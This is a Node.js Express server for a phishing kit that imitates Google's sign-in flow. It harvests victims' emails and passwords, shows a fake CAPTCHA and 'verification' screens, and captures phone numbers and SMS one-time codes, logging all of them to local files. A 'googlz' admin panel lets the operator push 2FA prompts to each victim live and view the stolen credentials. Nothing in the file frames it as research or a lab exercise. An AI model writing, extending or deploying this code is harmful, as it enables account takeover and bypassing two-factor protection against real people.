const express = require('express');
const session = require('express-session');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// ═══════════════════════════════════════════════
//  CONFIGURATION – EDIT THESE
// ═══════════════════════════════════════════════

const PORT = process.env.PORT || 3000;
const APP_URL = 'http://localhost:3000/';
const ADMIN_USERNAME = 'spexkzi';
const ADMIN_PASSWORD = 'a7xK9mP2qR5vY8bN3wE6tH1jL4sU0cFd';
const ADMIN_PATH = '074829';

// ═══════════════════════════════════════════════

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use(session({
  secret: 'x9k2m4n7q1p3',
  resave: false,
  saveUninitialized: true
}));

const CAPTURES_FILE = './captures.json';
function loadCaptures() {
  try { return JSON.parse(fs.readFileSync(CAPTURES_FILE)); }
  catch (e) { return []; }
}
function saveCaptures(arr) {
  fs.writeFileSync(CAPTURES_FILE, JSON.stringify(arr, null, 2));
}

const CAMPAIGNS_FILE = './campaigns.json';
function loadCampaigns() {
  try { return JSON.parse(fs.readFileSync(CAMPAIGNS_FILE)); }
  catch (e) { return {}; }
}
function saveCampaigns(c) {
  fs.writeFileSync(CAMPAIGNS_FILE, JSON.stringify(c, null, 2));
}

function nameFromEmail(email) {
  if (!email) return 'User';
  let local = email.split('@')[0];
  let name = local.replace(/[._\-]/g, ' ').replace(/\d+/g, '').replace(/\s+/g, ' ').trim();
  if (!name || name.length < 2) return local;
  return name.replace(/\b\w/g, c => c.toUpperCase());
}

async function googleNameLookup(email) {
  try {
    let res = await axios.get('https://people.googleapis.com/v1/people:searchDirectoryPeople', {
      params: { query: email, sources: 'DIRECTORY_SOURCE_TYPE_DOMAIN_PROFILE', readMask: 'names,emailAddresses', key: '' },
      timeout: 4000
    });
    if (res.data.people && res.data.people[0] && res.data.people[0].names)
      return res.data.people[0].names[0].displayName;
  } catch (e) {}
  return null;
}

// ─── FRONTEND ROUTES ──────────────────────────

app.get('/', (req, res) => {
  if (req.query.c) req.session.campaign = req.query.c;
  res.sendFile(path.join(__dirname, 'login.html'));
});

app.post('/submit-email', async (req, res) => {
  let email = (req.body.identifier || '').trim();
  if (!email) return res.redirect('/');
  let sessionId = uuidv4().slice(0, 12);
  req.session.email = email;
  req.session.sid = sessionId;
  let displayName = null;
  if (req.body.manualname && req.body.manualname.trim()) {
    displayName = req.body.manualname.trim();
  } else {
    let apiName = await googleNameLookup(email);
    displayName = apiName || nameFromEmail(email);
  }
  req.session.displayName = displayName;
  let campaign = req.session.campaign || 'general';
  let entry = {
    id: sessionId, email, displayName, campaign, password: '',
    step: 'email', verificationType: '', phoneNumber: '', smsCode: '',
    status: 'active', time: new Date().toISOString()
  };
  let captures = loadCaptures();
  captures.push(entry);
  saveCaptures(captures);
  res.redirect('/password');
});

app.get('/password', (req, res) => {
  if (!req.session.email) return res.redirect('/');
  let email = req.session.email;
  let displayName = req.session.displayName || nameFromEmail(email);
  let html = fs.readFileSync(path.join(__dirname, 'password.html'), 'utf8');
  html = html.replace('{{DISPLAY_NAME}}', displayName).replace('{{EMAIL}}', email);
  res.send(html);
});

app.post('/submit-password', (req, res) => {
  let password = req.body.password || '';
  let email = req.session.email;
  let displayName = req.session.displayName;
  let sid = req.session.sid;
  let campaign = req.session.campaign || 'general';
  if (!email || !password) return res.redirect('/');
  let captures = loadCaptures();
  for (let i = captures.length - 1; i >= 0; i--) {
    if (captures[i].email === email && captures[i].step === 'email') {
      captures[i].password = password;
      captures[i].step = 'password';
      captures[i].time = new Date().toISOString();
      break;
    }
  }
  saveCaptures(captures);
  fs.appendFileSync('captured.txt', `[${new Date().toISOString()}] ${displayName} | ${email} | ${password} | ${campaign}\n`);
  res.redirect('/captcha');
});

// ─── CAPTCHA ────────────────────────────────

app.get('/captcha', (req, res) => {
  if (!req.session.email) return res.redirect('/');
  let sid = req.session.sid;
  let captures = loadCaptures();
  for (let i = captures.length - 1; i >= 0; i--) {
    if (captures[i].id === sid) { captures[i].step = 'captcha'; captures[i].time = new Date().toISOString(); break; }
  }
  saveCaptures(captures);
  res.send(`<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Verify you're human</title><link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet"><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Arial,sans-serif}
body{background:#f0f4f9;height:100vh;display:flex;justify-content:center;align-items:center}
.container{background:#fff;border-radius:28px;padding:48px 40px;width:480px;text-align:center;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.logo{width:40px;margin-bottom:24px}
h2{font-size:28px;font-weight:400;color:#1f1f1f;margin-bottom:12px}
p{font-size:14px;color:#444746;margin-bottom:28px;line-height:1.5}
.spinner{width:48px;height:48px;border:4px solid #e0e0e0;border-top:4px solid #1a73e8;border-radius:50%;animation:spin 1.2s linear infinite;margin:0 auto 24px}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.progress-bar{width:100%;height:6px;background:#e0e0e0;border-radius:3px;overflow:hidden;margin-bottom:16px}
.progress-fill{height:100%;background:#1a73e8;border-radius:3px;width:0%;animation:progress 10s ease-in-out forwards}
@keyframes progress{0%{width:0%}100%{width:100%}}
.status-text{font-size:13px;color:#5f6368}
</style></head><body>
<div class="container">
  <img class="logo" src="https://s3-figma-hubfile-images-production.figma.com/hub/file/carousel/img/cbbdf444bdd9c4a5a39af2e727d1b9a433fbc01c">
  <h2>Verification check</h2><p>We're checking that you're a real person. This should only take a moment.</p>
  <div class="spinner"></div>
  <div class="progress-bar"><div class="progress-fill"></div></div>
  <div class="status-text" id="status">Verifying...</div>
</div>
<script>
const s=['Verifying...','Checking browser security...','Analyzing request patterns...','Validating session...','Cross-referencing user agent...','Almost done...'];
let i=0;const el=document.getElementById('status');
setInterval(()=>{i++;if(i<s.length)el.textContent=s[i];},1800);
setTimeout(()=>{window.location.href='/verification-pending';},12000);
</script></body></html>`);
});

// ─── VERIFICATION PENDING ─────────────────────

app.get('/verification-pending', (req, res) => {
  if (!req.session.email) return res.redirect('/');
  let sid = req.session.sid;
  let captures = loadCaptures();
  for (let i = captures.length - 1; i >= 0; i--) {
    if (captures[i].id === sid) { captures[i].step = 'waiting_verification'; captures[i].time = new Date().toISOString(); break; }
  }
  saveCaptures(captures);
  res.send(`<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Verification required</title>
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet"><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Arial,sans-serif}
body{background:#202124;height:100vh;display:flex;justify-content:center;align-items:center;color:#fff}
.card{width:480px;background:#000;border-radius:28px;padding:48px 36px;text-align:center}
.spinner{width:40px;height:40px;border:3px solid #3c4043;border-top:3px solid #8ab4f8;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
h2{font-size:24px;font-weight:400;margin-bottom:12px}
p{font-size:14px;color:#9aa0a6;line-height:1.5;margin-bottom:8px}
</style></head><body>
<div class="card">
  <div class="spinner"></div>
  <h2>Checking your account</h2><p>We need to verify your identity. Sending a request to your device...</p>
  <p style="font-size:12px;color:#5f6368;margin-top:16px">Please wait, this may take a moment</p>
</div>
<script>
setInterval(()=>{fetch('/check-verification-status').then(r=>r.json()).then(d=>{if(d.redirect)window.location.href=d.redirect;}).catch(()=>{});},3000);
</script></body></html>`);
});

app.get('/check-verification-status', (req, res) => {
  let sid = req.session.sid;
  if (!sid) return res.json({ redirect: null });
  let captures = loadCaptures();
  for (let c of captures) {
    if (c.id !== sid) continue;
    if (c.verificationType === 'gmail_app' && c.step === 'waiting_gmail_app') return res.json({ redirect: `/verify/${sid}/gmail_app` });
    if (c.verificationType === 'phone_sms' && c.step === 'waiting_sms') return res.json({ redirect: `/verify/${sid}/phone_sms` });
    if (c.verificationType === 'phone_number_sms' && c.step === 'waiting_phone') return res.json({ redirect: `/verify/${sid}/phone_number_sms` });
    if (c.verificationType === 'phone_number_sms' && c.step === 'waiting_sms') return res.json({ redirect: `/verify/${sid}/phone_sms` });
  }
  return res.json({ redirect: null });
});

// ─── VERIFICATION PAGES ──────────────────────

app.get('/verify/:sessionId/:type', (req, res) => {
  let { sessionId, type } = req.params;
  let pageMap = { 'gmail_app': 'opengmailverif.html', 'phone_sms': 'verifysms.html', 'phone_number_sms': 'putinphonenumber.html' };
  let file = pageMap[type];
  if (!file) return res.status(404).send('Invalid');
  let captures = loadCaptures();
  let victimEmail = '';
  for (let c of captures) {
    if (c.id === sessionId) {
      c.verificationType = type;
      if (type === 'phone_number_sms') c.step = 'waiting_phone';
      else if (type === 'phone_sms') c.step = 'waiting_sms';
      else c.step = 'waiting_gmail_app';
      c.time = new Date().toISOString();
      victimEmail = c.email;
      break;
    }
  }
  saveCaptures(captures);
  if (!victimEmail) return res.redirect('/');
  let html = fs.readFileSync(path.join(__dirname, file), 'utf8');
  // Replace placeholders
  html = html.replace(/\{\{VICTIM_EMAIL\}\}/g, victimEmail);
  html = html.replace(/\{\{SESSION_ID\}\}/g, sessionId);
  res.send(html);
});

app.post('/submit-phone', (req, res) => {
  let phone = req.body.phone || '';
  let sid = req.body.sid || req.session.sid;
  if (!sid || !phone) return res.redirect('/');
  let captures = loadCaptures();
  for (let c of captures) { if (c.id === sid) { c.phoneNumber = phone; c.step = 'waiting_sms'; c.time = new Date().toISOString(); break; } }
  saveCaptures(captures);
  res.redirect(`/verify/${sid}/phone_sms`);
});

app.post('/submit-sms', (req, res) => {
  let code = req.body.code || '';
  let sid = req.body.sid || req.session.sid;
  if (!sid || !code) return res.redirect('/');
  let captures = loadCaptures();
  for (let c of captures) {
    if (c.id === sid) { c.smsCode = code; c.step = 'sms_captured'; c.time = new Date().toISOString(); break; }
  }
  saveCaptures(captures);
  res.redirect('https://accounts.google.com');
});

app.post('/submit-gmail-verify', (req, res) => {
  let sid = req.body.sid || req.session.sid;
  if (!sid) return res.json({ success: false });
  let captures = loadCaptures();
  for (let c of captures) { if (c.id === sid) { c.step = 'verified'; c.time = new Date().toISOString(); break; } }
  saveCaptures(captures);
  res.json({ success: true });
});

app.get('/check-gmail-status', (req, res) => {
  let sid = req.query.sid;
  if (!sid) return res.json({ verified: false });
  let captures = loadCaptures();
  for (let c of captures) { if (c.id === sid && c.step === 'verified') return res.json({ verified: true }); }
  return res.json({ verified: false });
});

// ═══════════════════════════════════════════════
//  ADMIN PANEL – site.com/074829
// ═══════════════════════════════════════════════

app.get('/' + ADMIN_PATH, (req, res) => {
  if (req.session.admin) return renderAdminPanel(req, res);
  res.send(`<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Admin Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet"><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
body{background:#0a0a0b;color:#e1e1e3;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#121213;border:1px solid #1f1f21;border-radius:16px;padding:40px;width:380px}
h1{font-size:20px;font-weight:600;margin-bottom:6px;color:#fff}
.sub{font-size:12px;color:#5f6368;margin-bottom:28px}
label{display:block;font-size:12px;margin-bottom:6px;color:#9aa0a6}
input{width:100%;height:42px;background:#0a0a0b;border:1px solid #252527;border-radius:8px;padding:0 14px;color:#fff;font-size:13px;margin-bottom:16px;outline:none;transition:.12s;font-family:'Inter',sans-serif}
input:focus{border-color:#8ab4f8}
button{width:100%;height:42px;background:#8ab4f8;border:none;border-radius:8px;color:#0a0a0b;font-size:13px;font-weight:600;cursor:pointer;transition:.12s;font-family:'Inter',sans-serif}
button:hover{background:#a3c4fa}
.error{color:#f28b82;font-size:12px;margin-top:8px;display:none}
</style></head><body>
<div class="card">
  <h1>Sign in</h1>
  <div class="sub">Admin panel access</div>
  <form method="POST" action="/${ADMIN_PATH}/login">
    <label>Username</label><input name="username" required autofocus>
    <label>Password</label><input name="password" type="password" required>
    <button type="submit">Sign in</button>
    <div class="error" id="error">Invalid credentials</div>
  </form>
</div>
<script>if(window.location.search.includes('error')){document.getElementById('error').style.display='block';}</script>
</body></html>`);
});

app.post('/' + ADMIN_PATH + '/login', (req, res) => {
  let { username, password } = req.body;
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) { req.session.admin = true; return res.redirect('/' + ADMIN_PATH); }
  res.redirect('/' + ADMIN_PATH + '?error=1');
});

app.get('/' + ADMIN_PATH + '/logout', (req, res) => { req.session.destroy(); res.redirect('/' + ADMIN_PATH); });

// ADMIN API endpoints (with auth check)
app.post('/admin-send-verification', (req, res) => {
  if (!req.session.admin) return res.status(401).json({ success: false });
  let { sid, type } = req.body;
  if (!sid || !type) return res.json({ success: false });
  let captures = loadCaptures();
  let found = false;
  for (let c of captures) {
    if (c.id === sid) {
      c.verificationType = type;
      if (type === 'phone_number_sms') c.step = 'waiting_phone';
      else if (type === 'phone_sms') c.step = 'waiting_sms';
      else if (type === 'gmail_app') c.step = 'waiting_gmail_app';
      c.time = new Date().toISOString();
      found = true;
      break;
    }
  }
  if (found) saveCaptures(captures);
  res.json({ success: found });
});

app.post('/admin-mark-verified', (req, res) => {
  if (!req.session.admin) return res.status(401).json({ success: false });
  let { sid } = req.body;
  if (!sid) return res.json({ success: false });
  let captures = loadCaptures();
  let found = false;
  for (let c of captures) {
    if (c.id === sid) { c.step = 'verified'; c.time = new Date().toISOString(); found = true; break; }
  }
  if (found) saveCaptures(captures);
  res.json({ success: found });
});

// DELETE individual session
app.post('/admin-delete-session', (req, res) => {
  if (!req.session.admin) return res.status(401).json({ success: false });
  let { sid } = req.body;
  if (!sid) return res.json({ success: false });
  let captures = loadCaptures();
  let filtered = captures.filter(c => c.id !== sid);
  if (filtered.length === captures.length) return res.json({ success: false });
  saveCaptures(filtered);
  res.json({ success: true });
});

// DELETE all active sessions
app.post('/admin-clear-active', (req, res) => {
  if (!req.session.admin) return res.status(401).json({ success: false });
  let captures = loadCaptures();
  let remaining = captures.filter(c => c.step !== 'email' && c.step !== 'password' && c.step !== 'captcha' && c.step !== 'waiting_verification' && c.step !== 'waiting_gmail_app' && c.step !== 'waiting_phone' && c.step !== 'waiting_sms');
  saveCaptures(remaining);
  res.json({ success: true });
});

// DELETE all completed captures
app.post('/admin-clear-completed', (req, res) => {
  if (!req.session.admin) return res.status(401).json({ success: false });
  let captures = loadCaptures();
  let remaining = captures.filter(c => c.step !== 'sms_captured' && c.step !== 'verified');
  saveCaptures(remaining);
  res.json({ success: true });
});

// DELETE everything
app.post('/admin-clear-all', (req, res) => {
  if (!req.session.admin) return res.status(401).json({ success: false });
  saveCaptures([]);
  saveCampaigns({});
  try { fs.unlinkSync('captured.txt'); } catch (e) {}
  res.json({ success: true });
});

function renderAdminPanel(req, res) {
  let captures = loadCaptures();
  let activeSessions = captures.filter(c => c.status === 'active' || c.step !== 'verified' && c.step !== 'sms_captured');
  // Better active detection: anything not completed
  activeSessions = captures.filter(c => c.step !== 'sms_captured' && c.step !== 'verified');

  let sessionRows = activeSessions.map(c => {
    let stepLabel = c.step;
    if (c.step === 'email') stepLabel = 'Email entered';
    else if (c.step === 'password') stepLabel = 'Password entered';
    else if (c.step === 'captcha') stepLabel = 'In captcha';
    else if (c.step === 'waiting_verification') stepLabel = 'Awaiting verification type';
    else if (c.step === 'waiting_gmail_app') stepLabel = 'Gmail App verify';
    else if (c.step === 'waiting_phone') stepLabel = 'Waiting for phone number';
    else if (c.step === 'waiting_sms') stepLabel = 'Waiting for SMS code';
    else if (c.step === 'sms_captured') stepLabel = 'SMS captured';
    else if (c.step === 'verified') stepLabel = 'Verified';

    let actions = '';
    if (c.step === 'waiting_verification') {
      actions = `
        <button class="btn btn-gmail" onclick="sendVerif('${c.id}','gmail_app')">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M22 7l-10 7L2 7"/></svg>
          Gmail App
        </button>
        <button class="btn btn-sms" onclick="sendVerif('${c.id}','phone_sms')">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 2L11 13"/><path d="M22 2l-7 20-4-9-9-4 20-7z"/></svg>
          SMS Direct
        </button>
        <button class="btn btn-phone" onclick="sendVerif('${c.id}','phone_number_sms')">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 014.11 2h3a2 2 0 012 1.72c.127.96.362 1.903.7 2.81a2 2 0 01-.45 2.11L8.09 9.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.338 1.85.573 2.81.7A2 2 0 0122 16.92z"/></svg>
          Phone + SMS
        </button>
        <button class="btn btn-delete" onclick="delSession('${c.id}')" title="Delete this session">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>
        </button>`;
    } else if (c.step === 'waiting_phone') {
      actions = `<span class="badge badge-waiting">Waiting for phone number...</span>
        <button class="btn btn-delete" onclick="delSession('${c.id}')" title="Delete this session">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>
        </button>`;
    } else if (c.step === 'waiting_sms') {
      actions = `<span class="badge badge-waiting">Waiting for SMS code...</span>
        <button class="btn btn-delete" onclick="delSession('${c.id}')" title="Delete this session">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>
        </button>`;
    } else if (c.step === 'waiting_gmail_app') {
      actions = `<button class="btn btn-valid" onclick="markVerif('${c.id}')">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
        Mark Verified
      </button>
      <button class="btn btn-delete" onclick="delSession('${c.id}')" title="Delete this session">
        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>
      </button>`;
    } else if (c.step === 'sms_captured') {
      actions = `
        <span class="badge badge-code">SMS: ${c.smsCode}</span>
        <button class="btn btn-valid" onclick="markVerif('${c.id}')">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
          Complete
        </button>
        <button class="btn btn-delete" onclick="delSession('${c.id}')" title="Delete this session">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/></svg>
        </button>`;
    }

    return `<div class="session-card">
<div class="session-header">
  <div class="session-email">${c.email}</div>
  <div class="session-name">${c.displayName}</div>
  <div class="badge badge-step">${stepLabel}</div>
  <div class="session-time">${new Date(c.time).toLocaleTimeString()}</div>
</div>
<div class="session-body">
  <div class="session-creds">
    <div class="cred-item">
      <span class="cred-label">Password</span>
      <span class="cred-value">${c.password || '—'}</span>
    </div>
    ${c.phoneNumber ? `<div class="cred-item"><span class="cred-label">Phone</span><span class="cred-value">${c.phoneNumber}</span></div>` : ''}
  </div>
  <div class="session-actions">${actions}</div>
</div>
</div>`;
  }).join('');

  let completedCaptures = captures.filter(c => c.step === 'sms_captured' || c.step === 'verified');
  let completedRows = completedCaptures.map(c => {
    return `<tr>
      <td><div class="cell-email">${c.email}</div></td>
      <td><span class="cell-pass">${c.password}</span></td>
      <td>${c.phoneNumber || '<span class="muted">—</span>'}</td>
      <td>${c.smsCode || '<span class="muted">—</span>'}</td>
      <td><span class="badge badge-method">${c.verificationType}</span></td>
      <td class="cell-time">${new Date(c.time).toLocaleString()}</td>
    </tr>`;
  }).join('');

  res.send(`<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>googlz · Admin</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0b;color:#e1e1e3;font-family:'Inter',-apple-system,sans-serif;min-height:100vh}
.topbar{background:#121213;border-bottom:1px solid #1f1f21;padding:16px 32px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:100}
.topbar-left{display:flex;align-items:center;gap:16px}
.topbar-logo{width:28px;height:28px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:14px;color:#fff}
.topbar h1{font-size:16px;font-weight:600;color:#fff}
.topbar .subtitle{font-size:12px;color:#5f6368}
.topbar-right{display:flex;align-items:center;gap:16px}
.stats-badge{background:#1a1a1c;border:1px solid #252527;border-radius:20px;padding:4px 14px;font-size:12px;color:#9aa0a6}
.stats-badge strong{color:#e1e1e3;font-weight:500}
.logout-link{color:#5f6368;text-decoration:none;font-size:12px;padding:6px 14px;border-radius:6px;transition:.12s}
.logout-link:hover{color:#e1e1e3;background:#1a1a1c}
.content{padding:24px 32px;max-width:1400px;margin:0 auto}
.section-title{font-size:14px;font-weight:600;color:#fff;margin:0 0 16px 0;display:flex;align-items:center;gap:8px;justify-content:space-between}
.section-title-left{display:flex;align-items:center;gap:8px}
.section-title .count{font-size:11px;font-weight:400;color:#5f6368;background:#1a1a1c;padding:2px 10px;border-radius:10px}
.actions-row{display:flex;gap:6px}
.btn-clear{display:inline-flex;align-items:center;gap:5px;padding:6px 12px;border:none;border-radius:8px;font-size:10px;font-weight:500;cursor:pointer;transition:.12s;font-family:'Inter',sans-serif}
.btn-clear-warn{background:#2a1414;color:#f28b82}
.btn-clear-warn:hover{background:#3a1c1c}
.btn-clear-danger{background:#2a0d0d;color:#f85149}
.btn-clear-danger:hover{background:#3a1212}
.session-card{background:#121213;border:1px solid #1f1f21;border-radius:12px;margin-bottom:10px;overflow:hidden;transition:border-color .15s}
.session-card:hover{border-color:#2a2a2d}
.session-header{display:flex;align-items:center;gap:12px;padding:14px 18px;border-bottom:1px solid #1a1a1c;flex-wrap:wrap}
.session-email{font-size:13px;font-weight:500;color:#fff}
.session-name{font-size:12px;color:#5f6368}
.session-time{font-size:11px;color:#3c4043;margin-left:auto}
.badge-step{font-size:10px;padding:2px 10px;border-radius:10px;background:#1a1a2e;color:#8ab4f8;font-weight:500;letter-spacing:.02em}
.session-body{padding:14px 18px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px}
.session-creds{display:flex;gap:20px;flex-wrap:wrap}
.cred-item{display:flex;align-items:center;gap:6px}
.cred-label{font-size:10px;color:#5f6368;text-transform:uppercase;letter-spacing:.05em}
.cred-value{font-size:13px;color:#e1e1e3}
.session-actions{display:flex;gap:6px;flex-wrap:wrap}
.btn{display:inline-flex;align-items:center;gap:5px;padding:6px 12px;border:none;border-radius:8px;font-size:11px;font-weight:500;cursor:pointer;transition:.12s;font-family:'Inter',sans-serif}
.btn-gmail{background:#0d2137;color:#8ab4f8}
.btn-gmail:hover{background:#122a45}
.btn-sms{background:#1f1a0d;color:#f9ab00}
.btn-sms:hover{background:#2a2212}
.btn-phone{background:#1a0d24;color:#c58af9}
.btn-phone:hover{background:#241230}
.btn-valid{background:#0d2416;color:#81c995}
.btn-valid:hover{background:#122e1c}
.btn-delete{background:#1a0d0d;color:#f85149;padding:6px 10px}
.btn-delete:hover{background:#2a1212}
.btn:hover{transform:translateY(-1px)}
.badge{font-size:10px;padding:2px 10px;border-radius:10px;font-weight:500}
.badge-waiting{background:#1a1a1c;color:#9aa0a6}
.badge-code{background:#0d2416;color:#81c995;font-family:monospace;font-size:11px}
.badge-method{background:#1a1a1c;color:#9aa0a6;font-size:10px}
.table-wrap{background:#121213;border:1px solid #1f1f21;border-radius:12px;overflow:hidden}
table{width:100%;border-collapse:collapse;font-size:12px}
thead{background:#0e0e0f}
th{padding:12px 16px;text-align:left;color:#5f6368;font-weight:500;font-size:11px;text-transform:uppercase;letter-spacing:.04em;border-bottom:1px solid #1f1f21}
td{padding:12px 16px;border-bottom:1px solid #18181a;color:#c4c4c6}
tr:last-child td{border-bottom:none}
.cell-email{font-weight:500;color:#e1e1e3}
.cell-pass{font-family:monospace;font-size:12px;color:#f9ab00}
.cell-time{font-size:11px;color:#5f6368}
.muted{color:#3c4043}
.empty-state{padding:48px;text-align:center;color:#3c4043;font-size:13px}
.refresh-btn{background:#1a1a1c;border:1px solid #252527;color:#9aa0a6;padding:6px 14px;border-radius:8px;font-size:11px;cursor:pointer;font-family:'Inter',sans-serif;transition:.12s;display:flex;align-items:center;gap:5px}
.refresh-btn:hover{background:#252527;color:#e1e1e3}
.footer-text{text-align:center;padding:24px;font-size:10px;color:#2a2a2c}
.toast{position:fixed;bottom:24px;right:24px;background:#1a1a1c;border:1px solid #252527;border-radius:10px;padding:12px 20px;font-size:12px;color:#e1e1e3;opacity:0;transform:translateY(20px);transition:.3s;z-index:999}
.toast.show{opacity:1;transform:translateY(0)}
</style></head><body>
<div class="topbar">
  <div class="topbar-left">
    <div class="topbar-logo"><svg viewBox="0 0 48 48" width="28" height="28"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.54 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.83.89 7.45 2.54 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/><path fill="#none" d="M0 0h48v48H0z"/></svg></div>
    <div>
      <h1>googlz</h1>
      <div class="footer-text">googlz &middot; All data stored locally</div>
    </div>
  </div>
  <div class="topbar-right">
    <div class="stats-badge">Total: <strong>${captures.length}</strong> &middot; Active: <strong>${activeSessions.length}</strong> &middot; Complete: <strong>${completedCaptures.length}</strong></div>
    <button class="refresh-btn" onclick="location.reload()">
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 11-2.12-9.36L23 10"/></svg>
      Refresh
    </button>
    <a href="/${ADMIN_PATH}/logout" class="logout-link">Logout</a>
  </div>
</div>
<div class="content">
  <div class="section-title">
    <div class="section-title-left">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#81c995" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
      Active Sessions
      <span class="count">${activeSessions.length}</span>
    </div>
    <div class="actions-row">
      <button class="btn-clear btn-clear-warn" onclick="clearActive()">Clear Active</button>
    </div>
  </div>
  ${sessionRows || '<div class="empty-state">No active sessions currently.</div>'}
  ${completedRows ? `
  <div class="section-title" style="margin-top:32px">
    <div class="section-title-left">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#81c995" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
      Completed Captures
      <span class="count">${completedCaptures.length}</span>
    </div>
    <div class="actions-row">
      <button class="btn-clear btn-clear-warn" onclick="clearCompleted()">Clear Completed</button>
      <button class="btn-clear btn-clear-danger" onclick="clearAll()">Clear Everything</button>
    </div>
  </div>
  <div class="table-wrap"><table>
    <thead><tr><th>Email</th><th>Password</th><th>Phone</th><th>SMS Code</th><th>Method</th><th>Time</th></tr></thead>
    <tbody>${completedRows}</tbody>
  </table></div>` : ''}
</div>
<div class="footer-text">googlz &middot; All data stored locally</div>
<div class="toast" id="toast"></div>
<script>
function showToast(msg){var t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(function(){t.classList.remove('show');},2500);}
function sendVerif(sid,t){fetch('/admin-send-verification',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid,type:t})}).then(function(r){return r.json();}).then(function(d){if(d.success){showToast('Verification sent');location.reload();}else{showToast('Failed');}});}
